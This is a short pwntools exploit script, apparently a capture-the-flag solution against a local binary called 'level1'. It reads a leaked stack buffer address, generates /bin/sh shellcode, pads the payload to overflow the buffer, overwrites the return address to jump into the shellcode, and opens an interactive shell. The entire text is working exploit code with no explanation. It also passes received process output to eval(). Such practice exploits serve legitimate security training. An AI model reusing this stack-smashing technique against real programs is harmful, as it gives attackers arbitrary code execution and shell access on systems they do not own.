from pwn import *
io = process('./level1')

io.recvuntil(b'What\'s this:')
buf_addr = eval(io.recv(10))
shellcode = asm(shellcraft.sh())
payload = shellcode
payload = payload.ljust(0x88,b'\x00')+p32(0)+p32(buf_addr)
io.sendline(payload)
io.interactive()
